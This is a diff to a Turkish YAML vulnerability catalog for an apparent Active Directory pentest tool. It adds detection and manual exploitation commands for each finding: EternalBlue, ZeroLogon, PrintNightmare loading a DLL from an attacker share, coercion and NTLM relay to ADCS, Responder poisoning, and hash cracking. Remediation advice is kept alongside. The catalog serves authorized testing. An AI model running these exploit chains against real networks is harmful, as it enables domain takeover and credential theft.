@@ -1,6 +1,15 @@
 # Zafiyet Kataloğu — her kb_id bir bulgu türünü açıklar.
 # Alanlar: title, severity, category, cve, mitre, tags, phase, manual_only,
-#          summary, description, exploitation, remediation, references
+#          summary, description, detect_code, exploit_code, exploitation,
+#          remediation, references
+#
+# detect_code : bu aracın zafiyeti TESPİT için çalıştırdığı komut(lar).
+#               (Araçta hangi modülün ne çalıştırdığını birebir yansıtır.)
+# exploit_code: operatörün MANUEL sömürü için kullanabileceği somut komut/modül.
+#               Araç bunları ASLA otomatik çalıştırmaz — referans/başlangıç içindir.
+#
+# Placeholder'lar: <dc>=DC IP, <ip>=hedef host, <attacker>=dinleyici/saldırgan IP,
+#                  user:pass=domain kimliği (ör. lab.local/lowpriv:Passw0rd1).
 
 # ─────────────────────────────────────────────────────────────
 # SERVİS / ENVANTER (info — sömürü değil, bağlam)
@@ -15,11 +24,65 @@ live-hosts:
   description: >
     ICMP ve yaygın TCP portlarına ping ile canlı host listesi çıkarıldı.
     Bu bir zafiyet değil; sonraki fazlar için hedef envanteridir.
+  detect_code: |
+    # discovery modülü (Faz 0) — ICMP + TCP ping fallback
+    nmap -sn -n -PE -PS21,22,80,135,139,443,445,3389,88,389 \
+         -PA21,22,80,135,139,443,445,3389,88,389 <cidr>
+  exploit_code: |
+    # Sömürü yok (envanter). Sonraki adım: port/servis tarama
+    nmap -sV -n -T4 --top-ports 1000 <ip>
   remediation: >
     Gereksiz hostların/servislerin ağ erişimini segmentasyon ve host
     firewall ile kısıtlayın.
   references:
     - "https://nmap.org/book/host-discovery.html"
+
+open-ports:
+  title: "Açık portlar (host envanteri)"
+  severity: info
+  category: info
+  phase: portscan
+  manual_only: false
+  summary: "Host başına tespit edilen açık port/servis listesi."
+  description: >
+    nmap -sV ile hostta açık bulunan portlar, servis adı ve (varsa) ürün/sürüm
+    bilgisi. Zafiyet değil; operatörün her IP'de hangi portların açık olduğunu
+    görmesi için bilgi bulgusudur. Detaylar bulgu notunda listelenir.
+  detect_code: |
+    # portscan modülü — her canlı hostta servis/sürüm taraması
+    nmap -sV -n -T4 --top-ports 1000 --host-timeout 180s <ip>
+  exploit_code: |
+    # Sömürü yok (envanter). Açık porta göre ilgili servis enum'u yapılır.
+  remediation: >
+    Gereksiz servisleri kapatın; host firewall + segmentasyon ile erişimi
+    kısıtlayın.
+  references:
+    - "https://nmap.org/book/man-version-detection.html"
+
+smb-shares:
+  title: "Erişilebilir SMB paylaşımları (kimlikli)"
+  severity: info
+  category: info
+  phase: smb
+  manual_only: false
+  tags: [smb, share, enum]
+  summary: "Domain kimliğiyle erişilen paylaşımlar (IPC$/print$ hariç, READ/WRITE)."
+  description: >
+    Verilen domain hesabıyla host başına erişilebilen SMB paylaşımları ve izin
+    seviyeleri (READ / READ,WRITE). Yönetim/varsayılan paylaşımlar (IPC$, print$)
+    gizlenir. Bilgi bulgusudur; yazılabilir olanlar ayrıca 'writable-share'
+    yüksek bulgusunda çıkar.
+  detect_code: |
+    # smb modülü — domain kimliğiyle paylaşım listesi (IPC$/print$ filtrelenir)
+    nxc smb <hosts> -u user -p pass --shares
+  exploit_code: |
+    # Bilgi toplama. İçerik avı / yazılabilir paylaşıma dosya bırakma:
+    nxc smb <ip> -u user -p pass -M spider_plus
+  remediation: >
+    Paylaşım ve NTFS ACL'lerini en az yetkiye indirin; gereksiz paylaşımları
+    kaldırın.
+  references:
+    - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
 
 smb-exposed:
   title: "SMB servisi erişilebilir (445)"
@@ -32,6 +95,14 @@ smb-exposed:
   description: >
     SMB (445) açık. Tek başına zafiyet değil ama null session, signing,
     SMBv1, paylaşım ve relay kontrollerinin yapılacağı ana yüzey.
+  detect_code: |
+    # portscan modülü — 445 açık mı
+    nmap -sV -n -p445 <ip>
+  exploit_code: |
+    # Numaralandırma (sömürü değil, keşif)
+    nxc smb <ip> -u '' -p ''                 # null
+    nxc smb <ip> -u user -p pass --shares    # kimlikli paylaşımlar
+    enum4linux-ng -A <ip>
   remediation: >
     SMB'yi yalnızca gerekli hostlara açın; SMB signing'i zorunlu kılın;
     SMBv1'i kapatın.
@@ -49,6 +120,13 @@ rdp-exposed:
   description: >
     RDP açık. NLA kapalıysa BlueKeep ve kaba kuvvet yüzeyi genişler;
     ağ içinde yanal hareket için sık kullanılır.
+  detect_code: |
+    # portscan modülü — 3389 açık mı
+    nmap -sV -n -p3389 <ip>
+  exploit_code: |
+    # Elde edilen kimlikle RDP erişimi (yanal hareket)
+    nxc rdp <ip> -u user -p pass                 # erişim doğrula
+    xfreerdp /u:user /p:pass /v:<ip> /cert:ignore
   remediation: >
     NLA'yı zorunlu kılın, RDP'yi yalnızca atlama (jump) hostlarına açın,
     MFA/ağ seviyesinde erişim kontrolü uygulayın.
@@ -66,6 +144,14 @@ mssql-exposed:
   description: >
     MSSQL açık. Zayıf/varsayılan kimlik, xp_cmdshell ve linked-server
     zincirleri ile komut yürütme/yanal hareket mümkün olabilir.
+  detect_code: |
+    # portscan modülü — 1433 açık mı
+    nmap -sV -n -p1433 <ip>
+  exploit_code: |
+    # Kimlik denemesi + (sysadmin ise) komut yürütme
+    nxc mssql <ip> -u sa -p <pass> --local-auth
+    impacket-mssqlclient lab.local/user:pass@<ip> -windows-auth
+    # SQL> enable_xp_cmdshell; xp_cmdshell whoami
   remediation: >
     Güçlü kimlik, en az yetki, xp_cmdshell kapalı, linked-server
     hesaplarını kısıtlayın.
@@ -83,6 +169,13 @@ dc-detected:
   description: >
     Host, Kerberos ve LDAP portlarını açık tutuyor; büyük olasılıkla bir
     Domain Controller. AD enum, coercion ve relay kontrollerinin merkezi.
+  detect_code: |
+    # portscan modülü — 88 (Kerberos) + 389 (LDAP) açıksa DC adayı
+    nmap -sV -n -p88,389,445,636 <ip>
+  exploit_code: |
+    # DC'ye karşı AD enum (sömürü değil, keşif)
+    nxc ldap <ip> -u user -p pass --users --groups
+    nxc smb  <ip> -u user -p pass --pass-pol
   remediation: >
     DC'lerde LDAP/SMB signing + channel binding zorunlu olsun; gereksiz
     servisleri (Spooler) kapatın.
@@ -106,6 +199,18 @@ ms17-010:
     SMBv1'deki bellek bozulması ile kimlik doğrulamasız uzaktan kod
     çalıştırma. WannaCry/NotPetya'nın yayılma vektörü. Araç yalnızca
     tespit eder (nmap smb-vuln-ms17-010 / nxc --vuln).
+  detect_code: |
+    # quickcve modülü — nmap NSE (VULNERABLE/NOT VULNERABLE parse edilir)
+    nmap -Pn -p445 --script smb-vuln-ms17-010 <ip>
+  exploit_code: |
+    # MANUEL — BSOD riski. Metasploit:
+    msfconsole -q
+    use exploit/windows/smb/ms17_010_eternalblue
+    set RHOSTS <ip>
+    set LHOST <attacker>
+    run
+    # Alternatif (daha kontrollü): AutoBlue-MS17-010
+    #   https://github.com/3ndG4me/AutoBlue-MS17-010
   exploitation: >
     MANUEL — exploit hedefi çökertebilir (BSOD). Operatör kararı:
     Metasploit ms17_010_eternalblue veya AutoBlue ile, hedef/zamanlama
@@ -128,6 +233,16 @@ ms08-067:
   description: >
     Server servisindeki RPC işlemesinde kimlik doğrulamasız RCE. Yalnızca
     çok eski (XP/2003/2000) sistemlerde görülür.
+  detect_code: |
+    # Aktif tespit (nmap NSE); araç katalog-only
+    nmap -Pn -p445 --script smb-vuln-ms08-067 <ip>
+  exploit_code: |
+    # MANUEL — eski sistemde çökme riski
+    msfconsole -q
+    use exploit/windows/smb/ms08_067_netapi
+    set RHOSTS <ip>
+    set LHOST <attacker>
+    run
   exploitation: >
     MANUEL — Metasploit ms08_067_netapi. Eski sistemlerde kararsızlık/çökme
     riski; kontrollü denenir.
@@ -147,6 +262,22 @@ smbghost:
   description: >
     SMBv3 sıkıştırma başlığı işlemesinde tamsayı taşması; uzaktan kod
     çalıştırma ve yerel yetki yükseltme. Win10 1903/1909, Server 1903/1909.
+    Araç nxc -M smbghost (SMB 3.1.1 + compression göstergesi) ile YÜZEY tespiti
+    yapar. NOT: bu gösterge yama durumunu kesinleştirmez (patched 1903/1909 da
+    compression duyurabilir) → confidence=probable; build/KB ile teyit şart.
+    nmap'in güvenilir bir varsayılan NSE'si yok, bu yüzden nxc tercih edildi.
+  detect_code: |
+    # quickcve modülü — nxc smbghost (SMB 3.1.1 + compression göstergesi)
+    nxc smb <ip> -u '' -p '' -M smbghost
+    # Teyit: build 10.0.18362/18363 (1903/1909) ve KB4551762 yok mu?
+  exploit_code: |
+    # MANUEL — PoC kararsız, BSOD riski
+    msfconsole -q
+    use exploit/windows/smb/cve_2020_0796_smbghost
+    set RHOSTS <ip>
+    set LHOST <attacker>
+    run
+    # LPE PoC: https://github.com/danigargu/CVE-2020-0796
   exploitation: >
     MANUEL — PoC'ler kararsız, hedefi çökertebilir. Sürüm/yama tespiti
     yeterli; exploit operatör kararı.
@@ -165,7 +296,19 @@ bluekeep:
   summary: "RDP ön-kimlik uzaktan kod çalıştırma (wormable)."
   description: >
     RDP (3389) kanal işlemesinde kimlik doğrulamasız RCE. 2008 R2/7 ve
-    öncesi. Tespit bile servisi riske atabilir — dikkatli NSE kullanılır.
+    öncesi. Tespit bile servisi riske atabilir — araçta katalog-only.
+  detect_code: |
+    # Araç katalog-only (tespit bile riskli). Dikkatli NSE:
+    nmap -Pn -p3389 --script rdp-vuln-cve2019-0708 <ip>
+    # veya Metasploit auxiliary/scanner/rdp/cve_2019_0708_bluekeep (check)
+  exploit_code: |
+    # MANUEL — sık BSOD. Tek hedef, onaylı:
+    msfconsole -q
+    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+    set RHOSTS <ip>
+    set target <hedef-mimari>   # yanlış target = BSOD
+    set LHOST <attacker>
+    run
   exploitation: >
     MANUEL — exploit sık BSOD üretir. Yalnızca kontrollü, onaylı ve tek
     hedefte. Çoğu testte tespit + yama kanıtı yeterli kabul edilir.
@@ -187,6 +330,19 @@ zerologon:
     Netlogon (MS-NRPC) AES-CFB8 IV'sinin sıfır olması; kimlik doğrulamasız
     saldırgan DC makine hesabı parolasını sıfırlayabilir. Araç yalnızca
     zafiyet kontrolü yapar (non-exploit).
+  detect_code: |
+    # quickcve modülü — nxc non-exploit kontrol (VULNERABLE parse)
+    nxc smb <dc> -u '' -p '' -M zerologon
+  exploit_code: |
+    # KESİNLİKLE MANUEL — DC makine hesabı parolasını '' yapar, GERİ AL!
+    # 1) Teyit
+    python3 zerologon_tester.py DC01 <dc>
+    # 2) Exploit (parola sıfırla)
+    python3 cve-2020-1472-exploit.py DC01 <dc>
+    # 3) Hash'leri çek
+    impacket-secretsdump -no-pass -just-dc 'lab.local/DC01$'@<dc>
+    # 4) ZORUNLU RESTORE (aksi halde domain bozulur)
+    python3 reinstall_original_pw.py DC01 <dc> <eski_hex_hash>
   exploitation: >
     KESİNLİKLE MANUEL — gerçek exploit DC makine hesabı parolasını '' yapar;
     geri alınmazsa AD replikasyonu kırılır (domain bozulur). Yazılı onay +
@@ -209,6 +365,14 @@ printnightmare:
   description: >
     Print Spooler'ın RpcAddPrinterDriver işlemesinde kimlikli kullanıcının
     SYSTEM olarak kod çalıştırması. DC'de Spooler açıksa kritik.
+  detect_code: |
+    # quickcve modülü — nxc modül kontrolü
+    nxc smb <ip> -u user -p pass -M printnightmare
+  exploit_code: |
+    # MANUEL — kötü amaçlı DLL'i paylaşımdan yükletir
+    # DLL'i hazırla (msfvenom) + SMB paylaşımında yayınla, sonra:
+    python3 CVE-2021-1675.py lab.local/user:pass@<ip> '\\<attacker>\share\evil.dll'
+    # Impacket tabanlı: https://github.com/cube0x0/CVE-2021-1675
   exploitation: >
     MANUEL — CVE-2021-34527 PoC (ör. impacket) ile. DC'lerde Spooler kapatma
     önceliği; exploit operatör kararı.
@@ -221,8 +385,8 @@ printnightmare:
 # ─────────────────────────────────────────────────────────────
 # COERCION / RELAY YÜZEYİ (tespit; relay zinciri MANUEL)
 # ─────────────────────────────────────────────────────────────
-petitpotam:
-  title: "PetitPotam (MS-EFSRPC coercion)"
+coercion:
+  title: "DC auth zorlama (coercion: PetitPotam/PrinterBug/DFSCoerce)"
   severity: high
   category: config
   cve: [CVE-2021-36942]
@@ -230,54 +394,38 @@ petitpotam:
   phase: quickcve
   manual_only: true
   tags: [coercion, relay, dc]
-  summary: "EFSRPC ile kimlik doğrulamasız DC auth zorlama."
+  summary: "Kimlik doğrulamasız DC auth zorlama (MS-EFSR/MS-RPRN/MS-DFSNM) — tek yüzey."
   description: >
-    MS-EFSRPC EfsRpcOpenFileRaw ile DC'nin makine hesabıyla saldırgana
-    kimlik doğrulaması yapmaya zorlanması. ADCS ESC8'e relay ile domain
-    ele geçirme zinciri.
+    DC, çeşitli RPC yüzeyleriyle (MS-EFSRPC/PetitPotam, MS-RPRN/PrinterBug,
+    MS-DFSNM/DFSCoerce) makine hesabıyla saldırgana kimlik doğrulamaya
+    zorlanabilir. Hepsi aynı amaca hizmet eder (auth zorlama), bu yüzden tek
+    bulguda birleştirilir; hangi yöntemlerin açık olduğu bulgu notunda listelenir.
+    Zorlanan NTLM auth, ADCS ESC8'e veya signing=false hedefe relay edilerek
+    domain ele geçirmeye zincirlenir.
+  detect_code: |
+    # quickcve modülü — nxc coerce_plus (açık tüm yöntemler tek bulguda)
+    nxc smb <dc> -u user -p pass -M coerce_plus
+  exploit_code: |
+    # MANUEL — coercion + relay zinciri (iki terminal). Yönteme göre tetikleyici:
+    # T1: relay (ör. ADCS ESC8):
+    impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp \
+        -smb2support --adcs --template DomainController
+    # T2: DC'yi auth'a zorla (biri):
+    python3 PetitPotam.py -u user -p pass <attacker> <dc>      # MS-EFSR
+    python3 printerbug.py lab.local/user:pass@<dc> <attacker>  # MS-RPRN
+    python3 dfscoerce.py -u user -p pass -d lab.local <attacker> <dc>  # MS-DFSNM
+    # Dönen DC sertifikasıyla:
+    certipy-ad auth -pfx dc.pfx -dc-ip <dc>
   exploitation: >
-    MANUEL (yarı) — araç coercion yüzeyini ve signing=false/ESC8 hedeflerini
-    hazırlar; relay'in canlı koordinasyonu (PetitPotam + ntlmrelayx →
-    certsrv) operatör kontrolünde.
+    MANUEL (yarı) — araç coercion yüzeyini (hangi yöntemler açık) ve
+    signing=false/ESC8 hedeflerini hazırlar; relay'in canlı koordinasyonu
+    (coercion + ntlmrelayx) operatör kontrolünde.
   remediation: >
-    EFSRPC/MS-EFSR'yi kısıtlayın (KB5005413), EPA + SMB/LDAP signing zorunlu,
-    ADCS web enrollment'ta NTLM'i kapatın.
+    EFSRPC/MS-EFSR (KB5005413), Spooler ve DFSNM yüzeylerini kısıtlayın;
+    EPA + SMB/LDAP signing zorunlu; ADCS web enrollment'ta NTLM'i kapatın.
   references:
     - "https://github.com/topotam/PetitPotam"
-
-printerbug:
-  title: "PrinterBug (MS-RPRN coercion)"
-  severity: high
-  category: config
-  mitre: [T1187]
-  phase: quickcve
-  manual_only: true
-  tags: [coercion, relay, spooler]
-  summary: "Spooler RPC ile makine hesabı auth zorlama."
-  description: >
-    MS-RPRN RpcRemoteFindFirstPrinterChangeNotification ile Spooler çalışan
-    hostun kimlik doğrulamaya zorlanması. Unconstrained delegation/relay zinciri.
-  exploitation: >
-    MANUEL — dementor/printerbug ile coercion; relay veya unconstrained
-    delegation hedefine yönlendirme operatör kararı.
-  remediation: "Spooler'ı kapatın (özellikle DC); signing + EPA zorunlu."
-  references:
     - "https://github.com/leechristensen/SpoolSample"
-
-dfscoerce:
-  title: "DFSCoerce (MS-DFSNM coercion)"
-  severity: high
-  category: config
-  phase: quickcve
-  manual_only: true
-  tags: [coercion, relay, dc]
-  summary: "DFSNM ile DC auth zorlama (Spooler kapalı olsa da)."
-  description: >
-    MS-DFSNM NetrDfsAddStdRoot/NetrDfsRemoveStdRoot ile DC'yi auth'a zorlama.
-    Spooler/EFSRPC kapatılmış olsa bile çalışabilir.
-  exploitation: "MANUEL — DFSCoerce.py ile coercion; relay zinciri operatör kararı."
-  remediation: "Yamalar + signing/EPA zorunlu; RPC filtreleri."
-  references:
     - "https://github.com/Wh04m1001/DFSCoerce"
 
 nopac:
@@ -293,6 +441,14 @@ nopac:
     sAMAccountName/KDC doğrulama hataları; standart kullanıcı
     MachineAccountQuota>0 ile makine hesabı oluşturup DC olarak taklit ederek
     domain admin TGT alabilir.
+  detect_code: |
+    # quickcve modülü — nxc modül kontrolü (DC)
+    nxc smb <dc> -u user -p pass -M nopac
+  exploit_code: |
+    # MANUEL — makine hesabı oluşturur + DA olarak taklit eder
+    python3 noPac.py lab.local/user:pass -dc-ip <dc> -dc-host DC01 \
+        --impersonate administrator -use-ldap -shell
+    # veya sadece ticket: -dump (secretsdump zinciri)
   exploitation: >
     MANUEL — noPac.py/impacket ile; hesap oluşturma ve ticket üretimi
     (sömürü) sonraki faz.
@@ -318,6 +474,16 @@ smb-signing-disabled:
     SMB imzalama zorunlu olmayan hostlar, yakalanan NTLM kimlik doğrulamanın
     relay edilebileceği hedeflerdir. Araç bu hostları ayrı 'relay hedefi'
     listesine koyar.
+  detect_code: |
+    # smb modülü — banner'da signing:False parse edilir
+    nxc smb <hosts>
+    # (açıkça) nxc smb <hosts> --gen-relay-list relay_targets.txt
+  exploit_code: |
+    # YARI MANUEL — relay + coercion (iki terminal)
+    # T1: signing=false hedeflere relay (SMB→SMB komut yürütme)
+    impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"
+    # T2: auth'u coerce et (printerbug/petitpotam) veya Responder ile yakala
+    python3 printerbug.py lab.local/user:pass@<victim> <attacker>
   exploitation: >
     YARI MANUEL — coercion/Responder ile yakalanan auth, ntlmrelayx ile
     signing=false hedefe relay edilir (relay çalıştırma opt-in faz).
@@ -338,6 +504,13 @@ smbv1-enabled:
   description: >
     SMBv1 protokolü etkin. EternalBlue ailesi exploitleri ve protokol
     downgrade saldırıları için yüzey oluşturur.
+  detect_code: |
+    # smb modülü — banner'da SMBv1:True parse edilir
+    nxc smb <hosts>
+    nmap -Pn -p445 --script smb-protocols <ip>
+  exploit_code: |
+    # Sömürü yolu = MS17-010 zinciri (bkz. ms17-010 kaydı)
+    nmap -Pn -p445 --script smb-vuln-ms17-010 <ip>
   remediation: "SMBv1'i kaldırın (Disable-WindowsOptionalFeature / GPO)."
   references:
     - "https://learn.microsoft.com/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3"
@@ -353,6 +526,14 @@ null-session:
   description: >
     Kimlik doğrulamasız (null) oturumla kullanıcı listesi, paylaşımlar ve
     parola politikası gibi bilgiler okunabilir.
+  detect_code: |
+    # smb modülü — null kimlikle paylaşım erişimi parse edilir
+    nxc smb <ip> -u '' -p '' --shares
+  exploit_code: |
+    # Bilgi toplama (sömürü değil)
+    nxc smb <ip> -u '' -p '' --users --shares --pass-pol --rid-brute
+    enum4linux-ng -A <ip>
+    rpcclient -U '' -N <ip> -c 'enumdomusers'
   exploitation: >
     enum4linux-ng / nxc smb -u '' -p '' ile kullanıcı, grup, share ve
     pass-pol numaralandırma. Bilgi toplama — doğrudan erişim değil.
@@ -371,6 +552,12 @@ guest-enabled:
   tags: [smb]
   summary: "Yetkisiz erişim için guest ile oturum."
   description: "Guest hesabı etkin; kimlik doğrulamasız paylaşım/kaynak erişimi mümkün."
+  detect_code: |
+    # guest kimliğiyle oturum açılabiliyor mu
+    nxc smb <ip> -u 'guest' -p ''
+  exploit_code: |
+    # guest ile paylaşım/kullanıcı enum
+    nxc smb <ip> -u 'guest' -p '' --shares --users --rid-brute
   remediation: "Guest hesabını devre dışı bırakın (GPO)."
   references:
     - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
@@ -386,6 +573,15 @@ writable-share:
   description: >
     Herkese/Authenticated Users'a yazılabilir paylaşım. Veri sızıntısı yanı
     sıra SCF/.url/desktop.ini ile pasif hash yakalama yüzeyi.
+  detect_code: |
+    # smb modülü — share listesinde WRITE izni parse edilir
+    nxc smb <ip> -u user -p pass --shares
+  exploit_code: |
+    # YARI MANUEL — keşif + pasif hash yakalama
+    nxc smb <ip> -u user -p pass -M spider_plus          # dosya avı
+    # SCF/.url bırakıp Responder ile hash topla:
+    nxc smb <ip> -u user -p pass -M slinky -o SERVER=<attacker> NAME=important
+    sudo responder -I eth0
   exploitation: >
     YARI MANUEL — nxc spider ile keşif; yazılabilir share'e NTLM-tetikleyici
     dosya bırakma (opt-in). Hassas dosya avı (parola, config, kdbx).
@@ -405,6 +601,16 @@ llmnr-poisoning:
   description: >
     LLMNR/NBT-NS/mDNS açık; yanlış ad çözümleme isteklerine yanıt vererek
     NetNTLM hash yakalanabilir (Responder).
+  detect_code: |
+    # Pasif tespit (araç aktif zehirleme yapmaz)
+    sudo responder -I eth0 -A        # analyze modu: sadece dinle, yanıt verme
+  exploit_code: |
+    # YARI MANUEL (opt-in, gözetimli) — aktif zehirleme + kırma
+    sudo responder -I eth0 -wd
+    # Yakalanan NetNTLMv2:
+    hashcat -m 5600 responder_hashes.txt wordlist.txt
+    # veya relay (SMB signing kapalıysa):
+    impacket-ntlmrelayx -tf relay_targets.txt -smb2support
   exploitation: >
     YARI MANUEL (opt-in, gözetimli) — Responder analyze/pasif ile yüzey
     doğrulanır; aktif zehirleme gürültülü, kısa ve kontrollü çalıştırılır.
@@ -423,6 +629,16 @@ ipv6-wpad:
   description: >
     IPv6 varsayılan açık, DHCPv6 guard yok. mitm6 ile sahte DNS/WPAD
     üstlenip kimlik toplama ve relay mümkün.
+  detect_code: |
+    # Yüzey göstergesi: ağda IPv6 RA/DHCPv6 guard yok (manuel gözlem)
+    # Pasif: ağda IPv6 trafiği + DHCPv6 isteklerini izle (wireshark/tcpdump)
+    sudo tcpdump -i eth0 'ip6 and udp port 547'
+  exploit_code: |
+    # GÖZETİMLİ MANUEL — kısa süre, dar kapsam (ağı kesebilir)
+    # T1:
+    sudo mitm6 -d lab.local
+    # T2: LDAPS'e relay + RBCD/shadow delege
+    impacket-ntlmrelayx -6 -t ldaps://<dc> -wh wpad.lab.local --delegate-access
   exploitation: >
     GÖZETİMLİ MANUEL — mitm6 tüm segmentin DNS'ini üstlenir, ağı kesebilir.
     Kısa süreli, dar kapsamlı, operatör başında.
@@ -443,6 +659,14 @@ ntlmv1-enabled:
   description: >
     NTLMv1 izinli; yakalanan challenge/response kolayca kırılıp NTLM hash'e
     dönüştürülebilir (crack.sh).
+  detect_code: |
+    # nxc ntlmv1 modülü — LMCompatibilityLevel zayıf mı
+    nxc smb <hosts> -u user -p pass -M ntlmv1
+  exploit_code: |
+    # Responder ile NTLMv1 yakala (sabit challenge 1122334455667788):
+    sudo responder -I eth0 --lm
+    # crack.sh ile NT hash'e çevir (NTLMv1 → NTLM), sonra pass-the-hash:
+    nxc smb <ip> -u user -H <nthash>
   remediation: "LmCompatibilityLevel=5 (yalnız NTLMv2); NTLMv1'i yasaklayın."
   references:
     - "https://book.hacktricks.xyz/windows-hardening/ntlm"
@@ -458,6 +682,15 @@ webdav-enabled:
   description: >
     WebClient servisi çalışan hostlar HTTP üzerinden kimlik doğrulamaya
     zorlanıp (ör. search-connector/.url) relay edilebilir.
+  detect_code: |
+    # poison modülü — nxc webdav (WebClient çalışıyor mu)
+    nxc smb <hosts> -u user -p pass -M webdav
+  exploit_code: |
+    # MANUEL — HTTP coercion (WebClient) + LDAP(S) relay zinciri
+    # T1: LDAPS'e relay, RBCD delege et
+    impacket-ntlmrelayx -t ldaps://<dc> --delegate-access
+    # T2: WebDAV auth'u tetikle (ör. PetitPotam -pipe, veya .searchConnector-ms)
+    python3 PetitPotam.py -u user -p pass <attacker>@80/x <victim>
   remediation: "Gereksizse WebClient servisini kapatın; EPA + signing."
   references:
     - "https://book.hacktricks.xyz/windows-hardening/ntlm/httprelay"
@@ -473,8 +706,15 @@ ntlm-reflection-33073:
   summary: "SMB signing zorlanmıyor + yama eksik → aynı-host reflection."
   description: >
     SMB imzalama zorlanmayan ve yamasız hostlarda, coercion ile tetiklenen
-    auth aynı hosta reflect edilerek SYSTEM elde edilebilir. Çalıştırmadan
-    doğrulanır (signing + yama durumu).
+    auth aynı hosta reflect edilerek SYSTEM elde edilebilir. Araç nxc'nin
+    ntlm_reflection modülüyle doğrudan doğrular (CVE-2025-33073 kontrolü).
+  detect_code: |
+    # smb modülü — nxc ntlm_reflection (CVE-2025-33073 doğrudan kontrol)
+    nxc smb <ip> -u user -p pass -M ntlm_reflection
+  exploit_code: |
+    # MANUEL — coercion + aynı-host reflection (ntlmrelayx)
+    impacket-ntlmrelayx -t <ip> -smb2support   # reflection hedefi = kurban
+    python3 PetitPotam.py -u user -p pass <attacker> <ip>
   exploitation: >
     MANUEL — coercion (PetitPotam/printerbug) + ntlmrelayx reflection;
     relay çalıştırma opt-in/sonraki faz.
@@ -497,6 +737,15 @@ asrep-roastable:
   description: >
     DONT_REQ_PREAUTH ayarlı hesaplar için AS-REP'te şifreli parça kimlik
     doğrulamasız alınıp offline kırılabilir.
+  detect_code: |
+    # ad modülü — GetNPUsers ile hash çıkarma (OTOMATİK)
+    impacket-GetNPUsers lab.local/user:pass -dc-ip <dc> -request -format hashcat
+    # kimliksiz (kullanıcı listesi varsa):
+    impacket-GetNPUsers lab.local/ -no-pass -usersfile users.txt -dc-ip <dc>
+  exploit_code: |
+    # MANUEL — offline kırma, sonra kimlik olarak kullan
+    hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+    nxc smb <ip> -u <user> -p <crackedpass>
   exploitation: >
     Hash çıkarma OTOMATİK (GetNPUsers.py / nxc). Offline kırma MANUEL
     (hashcat -m 18200). Kırılan parola → geçerli kimlik.
@@ -517,6 +766,13 @@ kerberoastable:
     SPN atanmış kullanıcı hesapları için herhangi bir domain kullanıcısı TGS
     isteyip şifreli parçayı offline kırabilir. Zayıf parolalı servis hesapları
     yüksek risk.
+  detect_code: |
+    # ad modülü — GetUserSPNs ile TGS hash çıkarma (OTOMATİK)
+    impacket-GetUserSPNs lab.local/user:pass -dc-ip <dc> -request
+  exploit_code: |
+    # MANUEL — offline kırma (servis hesabı sık yüksek yetkili)
+    hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
+    nxc smb <ip> -u <svc> -p <crackedpass>
   exploitation: >
     Hash çıkarma OTOMATİK (GetUserSPNs.py / nxc). Offline kırma MANUEL
     (hashcat -m 13100). Kırılan servis hesabı sık yüksek yetkili.
@@ -537,6 +793,12 @@ weak-password-policy:
   description: >
     Düşük minimum uzunluk/karmaşıklık veya yüksek/eksik lockout eşiği parola
     spray ve kaba kuvveti kolaylaştırır. Araç spray'i lockout-aware yapar.
+  detect_code: |
+    # ad/kerberos modülü — lockout eşiği + politika okunur
+    nxc smb <dc> -u user -p pass --pass-pol
+  exploit_code: |
+    # MANUEL + lockout-aware — tek parola, pencere başına eşik-1 deneme
+    nxc smb <dc> -u users.txt -p 'Sonbahar2025!' --no-bruteforce --continue-on-success
   exploitation: >
     DİKKAT — password spray yalnızca lockout eşiği okunduktan ve güvenli
     marj hesaplandıktan sonra; politika okunamazsa otomatik DENENMEZ.
@@ -557,6 +819,12 @@ timeroasting:
   description: >
     Eski NTP authentication ile makine hesaplarının hash'i kimlik
     doğrulamasız toplanıp offline kırılabilir (zayıf makine parolaları).
+  detect_code: |
+    # Hash toplama (kimlik gerekmez)
+    python3 timeroast.py <dc>  -o timeroast.hash
+  exploit_code: |
+    # MANUEL — offline kırma (zayıf/varsayılan makine parolaları)
+    hashcat -m 31300 timeroast.hash wordlist.txt
   exploitation: "Hash toplama OTOMATİK (timeroast.py); kırma MANUEL (hashcat)."
   remediation: "NTP authentication'ı kısıtlayın; yamaları geçin."
   references:
@@ -578,6 +846,13 @@ gpp-cpassword:
   description: >
     Group Policy Preferences cpassword alanı, Microsoft'un yayımladığı sabit
     AES anahtarıyla çözülebilir. SYSVOL herkese okunur olduğundan parola açıkta.
+  detect_code: |
+    # ad modülü — nxc gpp_password (tespit + çözme OTOMATİK)
+    nxc smb <dc> -u user -p pass -M gpp_password
+  exploit_code: |
+    # Çözülmüş parolayı kullan (sık çok hostta yerel admin)
+    gpp-decrypt '<cpassword_base64>'
+    nxc smb <hosts> -u <gpp_user> -p <decrypted> --local-auth
   exploitation: >
     OTOMATİK tespit + çözme (Get-GPPPassword / gpp-decrypt). Çözülen yerel
     admin parolası sık birçok hostta geçerli.
@@ -598,6 +873,12 @@ description-password:
   description: >
     description/info alanlarına yazılmış parolalar herhangi bir domain
     kullanıcısıyla okunabilir; doğrudan kimlik bilgisi.
+  detect_code: |
+    # ad modülü — nxc get-desc-users (parola-benzeri açıklama filtrelenir)
+    nxc ldap <dc> -u user -p pass -M get-desc-users
+  exploit_code: |
+    # Bulunan parolayı kimlik olarak dene
+    nxc smb <hosts> -u <desc_user> -p '<description_parolasi>'
   exploitation: "OTOMATİK — ldap enum ile description taraması; bulunan parola denenir."
   remediation: "Açıklama alanlarından sırları temizleyin; farkındalık + denetim."
   references:
@@ -614,6 +895,15 @@ share-secret:
   description: >
     Okunabilir paylaşımlarda düz metin/çözülebilir parola içeren dosyalar
     (unattend/sysprep, web.config connection string, script, KeePass kdbx).
+  detect_code: |
+    # Paylaşım dosya avı (spider) — OTOMATİK keşif
+    nxc smb <hosts> -u user -p pass -M spider_plus
+    # (host üzerinde) Snaffler.exe -s -o snaffler.log
+  exploit_code: |
+    # Bulunan kimliği kullan; kdbx için offline kırma MANUEL
+    keepass2john secrets.kdbx > kdbx.hash
+    hashcat -m 13400 kdbx.hash wordlist.txt
+    nxc smb <hosts> -u <found_user> -p <found_pass>
   exploitation: >
     OTOMATİK keşif (share spider/Snaffler). Bulunan kimlik denenir; kdbx için
     offline kırma MANUEL.
